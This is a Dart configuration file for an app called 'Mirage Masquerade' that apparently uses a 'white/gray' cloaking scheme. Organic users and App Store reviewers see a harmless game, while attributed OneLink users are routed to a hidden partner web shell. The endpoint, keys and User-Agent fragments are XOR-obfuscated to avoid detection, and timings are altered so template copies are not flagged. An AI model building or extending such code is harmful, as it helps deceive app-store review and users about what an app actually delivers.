import '../core/mirror_codec.dart';

/// Central configuration for the veil (dual-mode) layer.
///
/// Secrets are stored as position-keyed XOR byte arrays produced by
/// `dart run tool/encode_veil_values.dart` (never plaintext). Public links
/// (privacy / support) are intentionally plaintext — encoding a URL that is
/// public in App Store Connect only advertises a decoder.
///
/// The veil gate stays closed (white game only) until `endpoint`,
/// `appsFlyerKey` and `firebaseProjectNumber` are all present.
abstract final class VeilConfig {
  // ── App identity ─────────────────────────────────────────────────────
  static const String appTitle = 'Mirage Masquerade';
  static const String bundleId = 'com.miragemasque.masqueradegame';

  /// iOS App Store numeric id — feeds GCD lookups and the config `store_id`.
  static const String iosStoreId = '6797925941';

  // ── Public links (plaintext on purpose) ──────────────────────────────
  static const String privacyUrl =
      'https://miragemasquerade.com/privacy-policy.html';
  static const String supportUrl =
      'https://miragemasquerade.com/support.html';

  // ── Timings (project-unique; not the template defaults) ───────────────
  // Just under three days on purpose: a +3-day clock advance is enough to
  // re-surface the push invite during QA. Kept off the template default so
  // it still counts as project diversification.
  static const int pushSnoozeSeconds = 244600; // ~2 d 20 h
  static const int organicRecheckSeconds = 9;

  /// DEBUG-ONLY escape hatch: force `af_status=Non-organic` into the config
  /// POST so the real server (`config.php`) returns the real partner URL and
  /// the mirror (gray) shell can be verified on a device without live
  /// AppsFlyer attribution. Guarded by `kDebugMode` at the call site, so it is
  /// dead-code-eliminated from release and can NEVER affect a shipped build.
  ///
  /// Default is `false` so the app follows real AppsFlyer attribution — an
  /// organic launch stays on the white game and only a genuine OneLink tap
  /// routes the user to the mirror. Enable it explicitly with
  /// `--dart-define=FORCE_MIRROR=true` when you need to verify the gray shell
  /// on a device without live attribution.
  static const bool debugForceMirror =
      bool.fromEnvironment('FORCE_MIRROR', defaultValue: false);

  /// RELEASE test opt-in for the same `FORCE_MIRROR` switch. Reads the SAME
  /// compile-time key but defaults to **`false`**, so a normal
  /// `flutter build ipa` (no `--dart-define`) folds this to `false` and
  /// tree-shakes every mirror-forcing branch out of the shipped binary — the
  /// store build always uses real attribution.
  ///
  /// Only a build **explicitly** compiled with
  /// `flutter run --release --dart-define=FORCE_MIRROR=true` (or the matching
  /// `build`) enables it, letting you verify the gray shell on a sideloaded
  /// release without a live App Store OneLink attribution.
  ///
  /// NEVER submit an IPA built with this flag on — it would route every user,
  /// including the App Store reviewer, into the mirror.
  static const bool forceMirrorRelease =
      bool.fromEnvironment('FORCE_MIRROR', defaultValue: false);

  /// DEBUG-ONLY sample attribution mirroring the AppsFlyer OneLink test link.
  /// On an organic test install AppsFlyer delivers no campaign/deep-link data,
  /// so the partner's "parameter passing" diagnostic stays red. When
  /// [debugForceMirror] is on we merge these (via `putIfAbsent`, so real
  /// attribution always wins) to prove the app forwards every OneLink field to
  /// `config.php`. Guarded by `kDebugMode`; never present in a release build.
  static const Map<String, String> debugMirrorParams = <String, String>{
    'media_source': 'Test Source',
    'pid': 'Test Source',
    'campaign':
        'testsub_testsub2_testsub_testsub_testsub_testsub_testsub_testsub1 #extra',
    'c': 'testsub_testsub2_testsub_testsub_testsub_testsub_testsub_testsub1 #extra',
    'campaign_id': 'testsub4',
    'af_c_id': 'testsub4',
    'adset': 'testsub',
    'af_adset': 'testsub3',
    'agency': 'Test Agency',
    'site_id': 'test_id',
    'af_sub1': 'testextra2',
    'af_sub2': 'testextra3',
    'af_sub3': 'testextra4',
    'af_sub4': 'testextra5',
    'af_sub5': 'testextra6',
    'is_retargeting': 'true',
    'deep_link_value': 'deep_link_test',
    'deep_link_sub1': 'deep_test_sub1',
  };

  // ── Encoded secrets (from tool/encode_veil_values.dart) ───────────────
  static const List<int> _endpoint = <int>[29, 71, 17, 5, 24, 118, 65, 97, 20, 15, 25, 68, 65, 66, 14, 19, 16, 82, 21, 19, 84, 21, 19, 19, 87, 84, 28, 3, 5, 29, 3, 30, 43, 4, 40, 92, 31, 8, 92];
  static const List<int> _gcd = <int>[29, 71, 17, 5, 24, 118, 65, 97, 30, 5, 15, 86, 66, 76, 77, 19, 19, 83, 19, 16, 74, 13, 18, 4, 87, 84, 28, 3, 5, 23, 2, 3, 57, 12, 35, 30, 48, 4, 77, 89, 71, 79, 5, 77, 20, 75, 64];
  static const List<int> _appsFlyerKey = <int>[59, 102, 55, 65, 24, 126, 47, 9, 15, 32, 93, 71, 104, 85, 13, 24, 48, 80, 85, 67, 94, 34];
  static const List<int> _firebaseProject = <int>[65, 10, 85, 64, 91, 123, 92, 118, 72, 81, 90, 18];
  static const List<int> _oneLinkHost = <int>[24, 90, 23, 20, 12, 41, 3, 47, 10, 23, 30, 64, 84, 70, 7, 23, 77, 76, 14, 19, 74, 29, 25, 29, 87, 90, 22];

  // User-Agent fragments — assembled at runtime so no plaintext browser
  // scaffolding nor partner identity tokens ship as literals in the binary.
  static const List<int> _uaProduct = <int>[56, 92, 31, 28, 7, 32, 15, 97, 76, 72, 91];
  static const List<int> _uaPlatformPrefix = <int>[93, 90, 53, 29, 4, 34, 11, 117, 89, 37, 59, 112, 6, 78, 51, 26, 12, 77, 5, 86, 105, 39];
  static const List<int> _uaPlatformSuffix = <int>[25, 90, 14, 16, 75, 1, 15, 45, 89, 41, 56, 5, 126, 14];
  static const List<int> _uaEngine = <int>[52, 67, 21, 25, 14, 27, 11, 44, 50, 15, 31, 10, 16, 23, 86, 92, 82, 13, 81, 67, 6, 92, 60, 62, 45, 122, 63, 66, 10, 18, 5, 27, 40, 77, 8, 23, 12, 11, 67, 4];
  static const List<int> _uaMobileToken = <int>[56, 92, 7, 28, 7, 41, 65, 127, 76, 35, 90, 17, 30];
  static const List<int> _safariVersion = <int>[71, 5, 75, 69];
  static const List<int> _safariTail = <int>[67, 3, 81, 91, 90];
  static const List<int> _uaAppIdToken = <int>[20, 67, 21, 28, 15, 99];
  static const List<int> _uaAppNameToken = <int>[20, 67, 21, 27, 10, 33, 11, 97];

  static String get endpoint => unmaskString(_endpoint);
  static String get gcdBase => unmaskString(_gcd);
  static String get appsFlyerKey => unmaskString(_appsFlyerKey);
  static String get firebaseProjectNumber => unmaskString(_firebaseProject);
  static String get oneLinkHost => unmaskString(_oneLinkHost);

  static String get uaProduct => unmaskString(_uaProduct);
  static String get uaPlatformPrefix => unmaskString(_uaPlatformPrefix);
  static String get uaPlatformSuffix => unmaskString(_uaPlatformSuffix);
  static String get uaEngine => unmaskString(_uaEngine);
  static String get uaMobileToken => unmaskString(_uaMobileToken);
  static String get safariVersion => unmaskString(_safariVersion);
  static String get safariTail => unmaskString(_safariTail);
  static String get uaAppIdToken => unmaskString(_uaAppIdToken);
  static String get uaAppNameToken => unmaskString(_uaAppNameToken);

  static String get storeToken => 'id$iosStoreId';

  /// Gate needs config endpoint + AppsFlyer key + Firebase project number.
  /// Optional values (OneLink) must NEVER be part of this predicate.
  static bool get veilCredentialsReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
